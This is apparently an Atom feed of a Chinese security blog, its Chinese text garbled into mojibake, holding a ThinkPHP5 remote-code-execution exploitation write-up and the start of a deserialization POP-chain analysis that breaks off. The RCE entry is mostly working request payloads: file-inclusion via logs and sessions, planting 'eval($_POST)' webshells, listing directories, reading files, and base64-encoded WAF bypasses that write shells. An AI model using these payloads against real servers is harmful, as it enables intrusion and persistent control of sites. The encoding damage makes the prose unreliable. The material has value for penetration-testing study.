<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Blog</title>
  
  <subtitle>maoblog</subtitle>
  <link href="https://cyxsec.github.io/atom.xml" rel="self"/>
  
  <link href="https://cyxsec.github.io/"/>
  <updated>2024-08-27T07:53:29.946Z</updated>
  <id>https://cyxsec.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>javaä»£ç å®¡è®¡-æ¡†æ¶ç»“æ„æ¢³ç†ç¯‡</title>
    <link href="https://cyxsec.github.io/2024/08/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%A1%86%E6%9E%B6%E7%BB%93%E6%9E%84%E6%A2%B3%E7%90%86%E7%AF%87/"/>
    <id>https://cyxsec.github.io/2024/08/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%A1%86%E6%9E%B6%E7%BB%93%E6%9E%84%E6%A2%B3%E7%90%86%E7%AF%87/</id>
    <published>2024-08-27T07:53:29.000Z</published>
    <updated>2024-08-27T07:53:29.946Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>SSRFæ”»é˜²æŒ‡åŒ—</title>
    <link href="https://cyxsec.github.io/2024/08/SSRF%E6%94%BB%E9%98%B2%E6%8C%87%E5%8C%97/"/>
    <id>https://cyxsec.github.io/2024/08/SSRF%E6%94%BB%E9%98%B2%E6%8C%87%E5%8C%97/</id>
    <published>2024-08-16T08:08:39.000Z</published>
    <updated>2024-08-16T08:08:39.042Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>ThinkPHP5-Rceå®æˆ˜ç¯‡</title>
    <link href="https://cyxsec.github.io/2024/08/ThinkPHP5-Rce%E5%AE%9E%E6%88%98%E7%AF%87/"/>
    <id>https://cyxsec.github.io/2024/08/ThinkPHP5-Rce%E5%AE%9E%E6%88%98%E7%AF%87/</id>
    <published>2024-08-16T03:05:58.000Z</published>
    <updated>2024-09-19T02:03:15.029Z</updated>
    
    <content type="html"><![CDATA[<h1 id="åº"><a class="markdownIt-Anchor" href="#åº"></a> åº</h1><p>é¦–å…ˆè¯´çš„è¿™ä¸ªrceæ˜¯callbackçš„é‚£ä¸ªrceï¼Œè¿™ä¸ªæ´å®æˆ˜é‡è§äº†å‡ æ¬¡ï¼Œæ„Ÿè§‰æœ‰å‡ ç‚¹å¾ˆæœ‰æ„æ€ï¼Œå› æ­¤è®°å½•ä¸€ä¸‹</p><h1 id="0x01-æ¼æ´éªŒè¯"><a class="markdownIt-Anchor" href="#0x01-æ¼æ´éªŒè¯"></a> 0x01 æ¼æ´éªŒè¯</h1><ol><li>ç½‘ä¸Šçš„å¾ˆå¤šå·¥å…·éƒ½é‡‡ç”¨è¿™ç§æ–¹å¼åšæ¼æ´éªŒè¯ï¼Œä½†æ˜¯è¿™ç§å¹¶æ²¡æœ‰è€ƒè™‘phpinfoè¢«disable</li></ol><p><strong>aaaaa</strong>=<strong>phpinfo</strong>&amp;<strong>_method</strong>=<strong>__construct</strong>&amp;<strong>filter</strong>[]=<strong>call_user_func</strong>&amp;<strong>method</strong>=<strong>post</strong></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918164858827.png" alt="image-20240918164858827" /></p><ol start="2"><li><p>xrayé‡‡ç”¨äº†var_dumpçš„æ–¹å¼ï¼Œä½†åˆ¤æ–­æ¡ä»¶å†™çš„æœ‰äº›é—®é¢˜ï¼Œç›´æ¥åŒ¹é…å­—ç¬¦ï¼Œå¯¼è‡´å¾ˆå¤šè¯¯æŠ¥ã€‚</p></li><li><p>å…¶å®å¯ä»¥åœ¨xrayçš„æ–¹å¼ä¸Šåšä¼˜åŒ–</p></li></ol><ul><li>æ·»åŠ è§„åˆ™ï¼Œåˆ¤æ–­stringå’Œlengthå…³é”®å­—ç­‰ç­‰</li></ul><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918165333020.png" alt="image-20240918165333020" /></p><ul><li>å†å¥—ä¸€å±‚filterï¼Œç”¨å¸¸è§„md5è®¡ç®—ï¼ˆç¯å¢ƒéƒ½æ˜¯æ²¡å¼€debugçš„ï¼Œå› æ­¤é»˜è®¤ä¹Ÿèƒ½ç”¨ï¼‰</li></ul><p><strong>aaaaa</strong>=<strong>123456</strong>&amp;<strong>_method</strong>=<strong>__construct</strong>&amp;<strong>filter</strong>[]=<strong>md5</strong>&amp;<strong>filter</strong>[]=<strong>var_dump</strong>&amp;<strong>method</strong>=<strong>post</strong></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240919094205025.png" alt="image-20240919094205025" /></p><h1 id="0x02-æ¼æ´åˆ©ç”¨"><a class="markdownIt-Anchor" href="#0x02-æ¼æ´åˆ©ç”¨"></a> 0x02 æ¼æ´åˆ©ç”¨</h1><h2 id="ä¸€-assertæ— æ³•ä½¿ç”¨"><a class="markdownIt-Anchor" href="#ä¸€-assertæ— æ³•ä½¿ç”¨"></a> ä¸€ã€assertæ— æ³•ä½¿ç”¨</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œphp7çš„assertå˜æˆéå‡½æ•°äº†ï¼Œä¹Ÿå°±æ— æ³•callbackè°ƒç”¨ï¼Œè¾¾åˆ°æ‰§è¡Œä»»æ„ä»£ç çš„æ•ˆæœï¼Œè¿™æ ·åˆ©ç”¨èµ·æ¥å°±å¾ˆéº»çƒ¦äº†ã€‚</p><p>å¯ä»¥å°è¯•æ›´æ¢å…¶ä»–å‡½æ•°ï¼Œå¦‚systemç­‰å‘½ä»¤æ‰§è¡Œå‡½æ•°ã€‚</p><p><strong>ç”šè‡³ä½ å¯ä»¥ä½¿ç”¨unserializeï¼Œç»“åˆpopé“¾åšæ¼æ´åˆ©ç”¨</strong></p><h2 id="äºŒ-æ–‡ä»¶åŒ…å«åˆ©ç”¨"><a class="markdownIt-Anchor" href="#äºŒ-æ–‡ä»¶åŒ…å«åˆ©ç”¨"></a> äºŒã€æ–‡ä»¶åŒ…å«åˆ©ç”¨</h2><p>è¿™ä¸ªåœ¨å®æˆ˜ä¸­ç»å¸¸ä½¿ç”¨</p><h3 id="æ—¥å¿—åŒ…å«"><a class="markdownIt-Anchor" href="#æ—¥å¿—åŒ…å«"></a> æ—¥å¿—åŒ…å«</h3><pre class="line-numbers language-none"><code class="language-none">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;server[]&#x3D;phpinfo&amp;get[]&#x3D;..&#x2F;data&#x2F;runtime&#x2F;log&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ§åˆ¶å™¨æŠ¥é”™æ²¡æœ‰è®°å½•åˆ°æ—¥å¿—é‡Œé¢ï¼ˆ?s=)ï¼Œå› æ­¤å¯ä»¥ç›´æ¥ç”¨è¿™ä¸ªæ´ï¼Œcallbackçš„è°ƒç”¨ä½ç½®ç»™åŠ ä¸Špayload</p><p><strong>aaaaa</strong>=<strong>&lt;</strong>?<strong>php</strong> <strong>phpinfo</strong>();?&gt;&amp;<strong>_method</strong>=<strong>__construct</strong>&amp;<strong>filter</strong>[]=<strong>call_user_func</strong>&amp;<strong>method</strong>=<strong>post</strong></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918171433593.png" alt="image-20240918171433593" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918171628457.png" alt="image-20240918171628457" /></p><h3 id="sessionåŒ…å«"><a class="markdownIt-Anchor" href="#sessionåŒ…å«"></a> sessionåŒ…å«</h3><p>è®¾ç½®session</p><pre class="line-numbers language-none"><code class="language-none">_method&#x3D;__construct&amp;filter[]&#x3D;think\Session::set&amp;method&#x3D;get&amp;get[]&#x3D;&lt;?php eval($_POST[&#39;c&#39;])?&gt;&amp;server[]&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918172313542.png" alt="image-20240918172313542" /></p><p>linuxå­˜tmp</p><pre class="line-numbers language-none"><code class="language-none">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;server[]&#x3D;phpinfo&amp;get[]&#x3D;&#x2F;tmp&#x2F;sess_ID&amp;c&#x3D;phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>windowsçœ‹å®é™…æƒ…å†µ</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918172450829.png" alt="image-20240918172450829" /></p><h4 id="å®æˆ˜é‡åˆ°çš„é—®é¢˜"><a class="markdownIt-Anchor" href="#å®æˆ˜é‡åˆ°çš„é—®é¢˜"></a> *å®æˆ˜é‡åˆ°çš„é—®é¢˜ï¼š</h4><p>å®æˆ˜ä¸­æˆ‘ä»¬å¯èƒ½è€ƒè™‘ä½¿ç”¨è¿™ç§å†™shellçš„æ–¹å¼</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918181907270.png" alt="image-20240918181907270" /></p><p>ä½†æ˜¯æˆ‘ä»¬å‘ç°æˆ‘ä»¬å†™å…¥çš„sessionæ–‡ä»¶å˜æ ·äº†</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918182839115.png" alt="image-20240918182839115" /></p><p>è·Ÿä¸€ä¸‹tpçš„ä»£ç ï¼š</p><p>å‘ç°å­—æ®µä¼šä»¥. åšåŒºåˆ†ï¼Œå› æ­¤æˆ‘ä»¬ä¸Šé¢çš„æ–‡ä»¶åä¼šåˆ†éš”å¼€</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918182918927.png" alt="image-20240918182918927" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918183023873.png" alt="image-20240918183023873" /></p><p>æ¢ä¸ªå†™shellæ–¹å¼å³å¯</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918183107326.png" alt="image-20240918183107326" /></p><h2 id="ä¸‰-å…¶ä»–åˆ©ç”¨"><a class="markdownIt-Anchor" href="#ä¸‰-å…¶ä»–åˆ©ç”¨"></a> ä¸‰ã€å…¶ä»–åˆ©ç”¨</h2><h3 id="åˆ—ç›®å½•"><a class="markdownIt-Anchor" href="#åˆ—ç›®å½•"></a> åˆ—ç›®å½•</h3><p><strong>_method</strong>=<strong>__construct</strong>&amp;<strong>filter</strong>[]=<strong>scandir</strong>&amp;<strong>filter</strong>[]=<strong>var_dump</strong>&amp;<strong>method</strong>=<strong>GET</strong>&amp;<strong>get</strong>[]=<strong>/</strong></p><p>å¯ä»¥åˆ©ç”¨payloadè¯»å–ç›®å½•</p><ul><li>ä¸€æ˜¯å¯ä»¥æ ¹æ®è¿™ä¸ªpayloadåˆ¤æ–­ç³»ç»Ÿæ˜¯å¦ä¸ºlinuxï¼ˆwindowsé»˜è®¤ä¼šåˆ—å½“å‰ç›˜ç¬¦è·Ÿç›®å½•ï¼‰</li></ul><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918172825785.png" alt="image-20240918172825785" /></p><ul><li>äºŒæ˜¯å¯ä»¥é€šè¿‡payloadå¯»æ‰¾æ—¥å¿—å’Œsessionç­‰ï¼Œé…åˆæ–‡ä»¶è¯»å–ï¼Œå¯ä»¥åšçš„äº‹æƒ…å¾ˆå¤š</li></ul><h3 id="è¯»æ–‡ä»¶"><a class="markdownIt-Anchor" href="#è¯»æ–‡ä»¶"></a> è¯»æ–‡ä»¶</h3><p>é…åˆåˆ—ç›®å½•å¯ä»¥åšçš„äº‹æƒ…æœ‰å¾ˆå¤šï¼Œåœ¨æç«¯ç¯å¢ƒä¸‹å¯ä»¥æ‹¿åˆ°å¾ˆå¤šä¸œè¥¿</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>highlight_file<span class="token operator">&amp;</span>method<span class="token operator">=</span><span class="token constant">GET</span><span class="token operator">&amp;</span>get<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918173108619.png" alt="image-20240918173108619" /></p><h1 id="0x03-wafç»•è¿‡"><a class="markdownIt-Anchor" href="#0x03-wafç»•è¿‡"></a> 0x03 wafç»•è¿‡</h1><p>æ—¥å¿—åŒ…å«çš„æ—¶å€™ï¼Œå…³é”®å­—è¢«æ‹¦æˆªæ€ä¹ˆåŠï¼Ÿ</p><ul><li>ç¼–ç å†™å…¥</li></ul><p>åˆ©ç”¨ä¸Šé¢çš„æ€è·¯ï¼Œç¼–ç å†™å…¥shell</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">_method=__construct&amp;method=get&amp;filter=think\Session::set&amp;get[]=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"OTE4LnBocA=="</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PD9waHAgcGhwaW5mbygpOz8%2b"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>å…³é”®å‡½æ•°è¿‡æ»¤</li></ul><p><a href="https://xz.aliyun.com/t/10534">https://xz.aliyun.com/t/10534</a></p><p>è¿™ç¯‡æ–‡ç« é‡‡å–äº†ä¼ªåè®®+å­—ç¬¦åè½¬çš„æ–¹å¼ç»•è¿‡å…³é”®å­—</p><p>å¦‚æœæ ¡éªŒäº†phpæ ‡ç­¾ä¹‹ç±»çš„ï¼Œé‚£ä¹ˆpayloadå°±åªèƒ½ç¼–ç å†™è¿›å»ï¼Œåé¢å°±è¦ç»“åˆä¼ªåè®®åˆ©ç”¨äº†ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token class-name class-name-fully-qualified static-context">think<span class="token punctuation">\</span>Session</span><span class="token operator">::</span><span class="token constant">set</span><span class="token operator">&amp;</span>method<span class="token operator">=</span>get<span class="token operator">&amp;</span>get<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>aaPD9waHAgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsnYWJjJ10pKTs<span class="token operator">/</span>Pg<span class="token operator">&amp;</span>server<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240919100313292.png" alt="image-20240919100313292" /></p><p>è¿™é‡Œçš„bbæ˜¯ä¸ºäº†è¡¥å……base64çš„ä½æ•°ï¼Œåé¢ä½¿ç”¨ä¼ªåè®®decodeæ—¶å€™å¯ä»¥æ­£ç¡®è§£ç åˆ°payloadã€‚å› ä¸ºsessionæ ¼å¼æ˜¯å›ºå®šçš„ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5C20221011121738-a44e4b00-491b-1.png" alt="20221011121738-a44e4b00-491b-1" /></p><h1 id="å‚è€ƒæ–‡ç« "><a class="markdownIt-Anchor" href="#å‚è€ƒæ–‡ç« "></a> å‚è€ƒæ–‡ç« </h1><p><a href="https://xz.aliyun.com/t/10397">https://xz.aliyun.com/t/10397</a></p><p><a href="https://xz.aliyun.com/t/10534">https://xz.aliyun.com/t/10534</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;åº&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#åº&quot;&gt;&lt;/a&gt; åº&lt;/h1&gt;
&lt;p&gt;é¦–å…ˆè¯´çš„è¿™ä¸ªrceæ˜¯callbackçš„é‚£ä¸ªrceï¼Œè¿™ä¸ªæ´å®æˆ˜é‡è§äº†å‡ æ¬¡ï¼Œæ„Ÿè§‰æœ‰å‡ ç‚¹å¾ˆæœ‰æ„æ€ï¼Œå› æ­¤è®°å½•ä¸€ä¸‹&lt;/p&gt;
&lt;h1 id=&quot;0x01-æ¼æ´éªŒè¯&quot;</summary>
      
    
    
    
    
    <category term="ThinkPHP" scheme="https://cyxsec.github.io/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>SQLæ³¨å…¥è¿‡æ»¤å­—ç¬¦æ¸—é€æŒ‡åŒ—</title>
    <link href="https://cyxsec.github.io/2024/07/SQL%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6%E6%B8%97%E9%80%8F%E6%8C%87%E5%8C%97/"/>
    <id>https://cyxsec.github.io/2024/07/SQL%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6%E6%B8%97%E9%80%8F%E6%8C%87%E5%8C%97/</id>
    <published>2024-07-23T08:40:55.000Z</published>
    <updated>2024-07-23T08:40:55.405Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>ThinkPHPååºåˆ—åŒ–POPé“¾åˆ†æ</title>
    <link href="https://cyxsec.github.io/2024/07/ThinkPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://cyxsec.github.io/2024/07/ThinkPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2024-07-16T08:13:31.000Z</published>
    <updated>2024-09-18T08:26:54.366Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-ååºåˆ—åŒ–åˆ©ç”¨é“¾"><a class="markdownIt-Anchor" href="#0x01-ååºåˆ—åŒ–åˆ©ç”¨é“¾"></a> 0x01 ååºåˆ—åŒ–åˆ©ç”¨é“¾</h1><h2 id="å®¡è®¡æ€è·¯"><a class="markdownIt-Anchor" href="#å®¡è®¡æ€è·¯"></a> å®¡è®¡æ€è·¯</h2><p><strong>phpé­”æœ¯æ–¹æ³•</strong></p><pre class="line-numbers language-none"><code class="language-none">__callè°ƒç”¨ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è¢«è°ƒç”¨__callStaticè°ƒç”¨ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„é™æ€æ–¹æ³•æ—¶è¢«è°ƒç”¨__cloneè¿›è¡Œå¯¹è±¡cloneæ—¶è¢«è°ƒç”¨ï¼Œç”¨æ¥è°ƒæ•´å¯¹è±¡çš„å…‹éš†è¡Œä¸º__constuctæ„å»ºå¯¹è±¡çš„æ—¶è¢«è°ƒç”¨ï¼›__debuginfoå½“è°ƒç”¨var_dump()æ‰“å°å¯¹è±¡æ—¶è¢«è°ƒç”¨ï¼ˆå½“ä½ ä¸æƒ³æ‰“å°æ‰€æœ‰å±æ€§ï¼‰é€‚ç”¨äºPHP5.6ç‰ˆæœ¬__destructæ˜ç¡®é”€æ¯å¯¹è±¡æˆ–è„šæœ¬ç»“æŸæ—¶è¢«è°ƒç”¨ï¼›__getè¯»å–ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨å±æ€§æ—¶è¢«è°ƒç”¨__invokeå½“ä»¥å‡½æ•°æ–¹å¼è°ƒç”¨å¯¹è±¡æ—¶è¢«è°ƒç”¨__issetå¯¹ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è¢«è°ƒç”¨__setå½“ç»™ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨å±æ€§èµ‹å€¼æ—¶è¢«è°ƒç”¨__set_stateå½“è°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•è¢«è°ƒç”¨ã€‚ç”¨__set_stateçš„è¿”å›å€¼åšä¸ºvar_exportçš„è¿”å›å€¼ã€‚__sleepå½“ä½¿ç”¨serializeæ—¶è¢«è°ƒç”¨ï¼Œå½“ä½ ä¸éœ€è¦ä¿å­˜å¤§å¯¹è±¡çš„æ‰€æœ‰æ•°æ®æ—¶å¾ˆæœ‰ç”¨__toStringå½“ä¸€ä¸ªç±»è¢«è½¬æ¢æˆå­—ç¬¦ä¸²æ—¶è¢«è°ƒç”¨__unsetå¯¹ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§è¿›è¡Œunsetæ—¶è¢«è°ƒç”¨__wakeupå½“ä½¿ç”¨unserializeæ—¶è¢«è°ƒç”¨ï¼Œå¯ç”¨äºåšäº›å¯¹è±¡çš„åˆå§‹åŒ–æ“ä½œ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ååºåˆ—åŒ–çš„èµ·ç‚¹ï¼š</strong></p><p>__wakeupå’Œ__destructä¸¤ä¸ªé­”æœ¯æ–¹æ³•</p><p><strong>ååºåˆ—åŒ–çš„è·³æ¿ï¼š</strong></p><pre class="line-numbers language-none"><code class="language-none">__toString å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²ä½¿ç”¨__get è¯»å–ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨å±æ€§æ—¶è¢«è°ƒç”¨__set å½“ç»™ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨å±æ€§èµ‹å€¼æ—¶è¢«è°ƒç”¨__isset å¯¹ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è¢«è°ƒç”¨__call è°ƒç”¨ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è¢«è°ƒç”¨<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ååºåˆ—åŒ–çš„ç»ˆç‚¹ï¼š</strong></p><pre class="line-numbers language-none"><code class="language-none">call_user_func å›è°ƒå‡½æ•°call_user_func_array å›è°ƒå‡½æ•°file_put_contents æ–‡ä»¶å†™å…¥$a($b) å˜é‡å‡½æ•°<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ååºåˆ—åŒ–é“¾çš„å®¡è®¡æ€è·¯å°±æ˜¯æŠŠä¸Šé¢çš„æ€è·¯è”ç³»èµ·æ¥ï¼š</p><ol><li>å¯»æ‰¾__wakeupå’Œ__destructé­”æœ¯æ–¹æ³•ï¼ŒæŸ¥çœ‹é‡Œé¢æ˜¯å¦æœ‰æœºä¼šè°ƒç”¨å…¶ä»–é­”æœ¯æ–¹æ³•ï¼Œæ¯”å¦‚è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•ä¼šè°ƒç”¨__callçš„é­”æœ¯æ–¹æ³•</li><li>æ¥ä¸‹æ¥çš„æ€è·¯å°±æ˜¯ç»§ç»­å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„é­”æœ¯æ–¹æ³•</li><li>å¯»æ‰¾æœ€ç»ˆçš„ç»ˆç‚¹å‡½æ•°ï¼Œå¦‚æ–¹æ³•ä¸­å­˜åœ¨callbackè°ƒç”¨å’Œæ–‡ä»¶å†™å…¥ã€å˜é‡å‡½æ•°ç­‰ç­‰ï¼Œæ€»ä¹‹å°±èƒ½èƒ½æ¼æ´åˆ©ç”¨çš„ç‚¹ã€‚</li></ol><p>è¿™å°±æ˜¯æ•´ä¸ªååºåˆ—åŒ–é“¾çš„æ„é€ æ–¹å¼</p><h2 id="1thinkphp-50x-ååºåˆ—åŒ–"><a class="markdownIt-Anchor" href="#1thinkphp-50x-ååºåˆ—åŒ–"></a> â‘ ThinkPHP 5.0.x ååºåˆ—åŒ–</h2><p>æµ‹è¯•ç‰ˆæœ¬ï¼š5.0.24</p><h3 id="ä¸€-ååºåˆ—åŒ–é“¾è°ƒé€šè¿‡ç¨‹"><a class="markdownIt-Anchor" href="#ä¸€-ååºåˆ—åŒ–é“¾è°ƒé€šè¿‡ç¨‹"></a> ä¸€ã€ååºåˆ—åŒ–é“¾è°ƒé€šè¿‡ç¨‹</h3><h4 id="1-å¯»æ‰¾å…¥å£ç‚¹"><a class="markdownIt-Anchor" href="#1-å¯»æ‰¾å…¥å£ç‚¹"></a> 1. å¯»æ‰¾å…¥å£ç‚¹</h4><p>å¯»æ‰¾__destructé­”æœ¯æ–¹æ³•</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911150823578.png" alt="image-20240911150823578" /></p><h4 id="2-å¯»æ‰¾ä¸­é€”çš„é­”æœ¯æ–¹æ³•"><a class="markdownIt-Anchor" href="#2-å¯»æ‰¾ä¸­é€”çš„é­”æœ¯æ–¹æ³•"></a> 2. å¯»æ‰¾ä¸­é€”çš„é­”æœ¯æ–¹æ³•</h4><ol><li>è·Ÿå…¥removeFilesæ–¹æ³•ï¼Œè¿™é‡Œå¤„ç†$filenameå˜é‡ï¼Œunlinkä¼šè§¦å‘toStringé­”æœ¯æ–¹æ³•ã€‚</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911151148298.png" alt="image-20240911151148298" /></p><ol start="2"><li>å¯»æ‰¾å¯ä½¿ç”¨çš„toStringæ–¹æ³•</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911151718647.png" alt="image-20240911151718647" /></p><p>è·Ÿå…¥toJsonæ–¹æ³•</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911151808198.png" alt="image-20240911151808198" /></p><p>è·Ÿå…¥toArrayæ–¹æ³•</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5C2135181-20211128215457370-1791873425.png" alt="2135181-20211128215457370-1791873425" /></p><p>912è¡Œè¿™é‡Œæœ‰ä¸€ä¸ªå¯¹è±¡è°ƒç”¨æ–¹æ³•çš„ä»£ç ï¼Œåœ¨æ‰¾ä¸åˆ°å¯¹è±¡çš„æ–¹æ³•æ—¶ï¼Œä¼šè°ƒç”¨__callé­”æœ¯æ–¹æ³•</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911153458094.png" alt="image-20240911153458094" /></p><ol start="3"><li>å¯»æ‰¾å¯åˆ©ç”¨çš„__callé­”æœ¯æ–¹æ³•</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911154109705.png" alt="image-20240911154109705" /></p><p>è·Ÿå…¥blockæ–¹æ³•</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911154154119.png" alt="image-20240911154154119" /></p><p>è·Ÿå…¥writelnæ–¹æ³•</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911154238309.png" alt="image-20240911154238309" /></p><p>è·Ÿå…¥åˆ°writeæ–¹æ³•ï¼Œè¿™é‡Œå¯èƒ½å¾—åˆ°äº†ä¸€ä¸ªè°ƒç”¨ä»»æ„ç±»çš„writeæ–¹æ³•çš„åœ°æ–¹</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911154252886.png" alt="image-20240911154252886" /></p><p>è¿™é‡Œå¾—åˆ°äº†ä¸€ä¸ªè°ƒç”¨ä»»æ„ç±»çš„setæ–¹æ³•çš„åœ°æ–¹</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911154444740.png" alt="image-20240911154444740" /></p><h4 id="3æ‰¾åˆ°æœ€ç»ˆåˆ©ç”¨ç‚¹"><a class="markdownIt-Anchor" href="#3æ‰¾åˆ°æœ€ç»ˆåˆ©ç”¨ç‚¹"></a> 3.æ‰¾åˆ°æœ€ç»ˆåˆ©ç”¨ç‚¹</h4><p>setæ–¹æ³•å°±å¾ˆç†Ÿæ‚‰äº†ï¼Œæˆ‘ä»¬ä¹‹å‰åˆ†æå‘½ä»¤æ‰§è¡Œçš„æ—¶å€™</p><p>\think\cache\driver\File::set</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911154651163.png" alt="image-20240911154651163" 